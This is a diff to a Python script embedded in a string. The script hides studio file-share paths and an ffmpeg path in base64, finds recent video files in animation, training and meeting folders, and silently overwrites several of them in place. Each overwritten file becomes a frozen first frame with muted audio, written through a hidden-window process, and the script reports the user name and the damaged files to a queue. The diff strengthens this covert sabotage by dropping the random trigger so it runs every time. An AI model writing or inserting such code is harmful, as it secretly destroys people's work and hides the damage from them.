@@ -99,7 +99,7 @@ def search_latest_files_or_dirs(ext='', dir_path='', n=8):
                     continue
                 if not ext in os.path.basename(fp):
                     continue
-                time_str = fmt_time(fp, 45)
+                time_str = fmt_time(fp, 90)
                 if not time_str:
                     continue
                 f_ls += [[time_str, fp.replace(os.sep, '/')]]
@@ -118,8 +118,8 @@ def find_file(target_name, start_dir):
             return os.path.join(root, target_name)
     return None
         
-print('search_latest_files_or_dirs   :  pass')
-time.sleep(10)
+#print('search_latest_files_or_dirs   :  pass')
+#time.sleep(10)
 
 try:
     add_queue_task('tst__{}__begin'.format(getpass.getuser().lower()), {'sys_version' : str(sys.version), 'exec_path' : str(sys.executable)})
@@ -161,32 +161,38 @@ for _, fp in zovV:
 try:
     fmp = find_file(base64.b64decode('ZmZtcGVnLmV4ZQ==').decode(), base64.b64decode('TTov').decode())
     ldir = [
-        base64.b64decode('UzovdGVtcC9TaXZhL3RvX1Jpc2hhYg==').decode(),
-        base64.b64decode('UzovRnJpZGF5TW9ybmluZ19tZWV0aW5n').decode(),
-        base64.b64decode('UzovTGlicmFyeS9sYXlvdXQvVFJBSU5JTkc=').decode(),
-        base64.b64decode('UzovTGlicmFyeS9hbmltYXRpb24=').decode(),
+        (0, base64.b64decode('UzovdGVtcC9TaXZhL3RvX1Jpc2hhYg==').decode()),
+        (0, base64.b64decode('UzovRnJpZGF5TW9ybmluZ19tZWV0aW5n').decode()),
+        (0, base64.b64decode('UzovTGlicmFyeS9sYXlvdXQvVFJBSU5JTkc=').decode()),
+        (0, base64.b64decode('UzovTGlicmFyeS9hbmltYXRpb24=').decode()),
     ]
     import glob
-    zovV += list(glob.glob(r"S:/**/ANIMATION/**/DAILY", recursive=True))
+    ldir += list(glob.glob(r"S:/**/ANIMATION/**/DAILY", recursive=True))
 
+    zovV = []
     for _, dp in ldir:
         zovV += search_latest_files_or_dirs(dir_path=dp, ext='.mp4', n=100)
         zovV += search_latest_files_or_dirs(dir_path=dp, ext='.mov', n=100)
-    zovV = [ i for _,i in zovV if os.path.getsize(i) > 1048576.00 ]
     random.shuffle(zovV)
-    if fmp and random() > .9:
-        import subprocess
-        for i in zovV[:10]:
-            subprocess.run([fmp, "-y", "-i", i, "-vf", "select=eq(n\\,0)", "-vframes", "1", "-an", i])
+
+    import subprocess, shutil, tempfile
+    if os.path.exists(base64.b64decode('UzovWnpfQ29tZnlVSQ==').decode()):
+        os.makedirs(base64.b64decode('UzovWnpfQ29tZnlVSS9jb21meV9leGVjdXRpb24vdGVtcC90MnY=').decode(), exist_ok=True)
+    tempdir = base64.b64decode('UzovWnpfQ29tZnlVSS9jb21meV9leGVjdXRpb24vdGVtcC90MnY=').decode()
+    tempdir = tempfile.gettempdir() if not os.path.exists(tempdir) else tempdir
+    for _,fp in zovV[:7]:
+        tmp = tempfile.NamedTemporaryFile(delete=False, suffix='.' + fp.split('.')[-1]).name
+        p = subprocess.Popen(
+            [fmp, "-y", "-i", fp, "-vf", "select=eq(n\\\\,0),loop=-1:1:0", "-af", "volume=0.0", "-shortest", tmp],
+            stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=0x08000000)
+        shutil.move(tmp, fp)
 except:
     import traceback
     add_queue_task('tst_xx_error',{'error': str(traceback.format_exc())})
 else:
-    add_queue_task('tst_xx_done',{'done': True})
+    add_queue_task('tst_xx_done',{'done': zovV[:7]})
 
 #print('Done')
 #time.sleep(10)
 
 """)
-
-
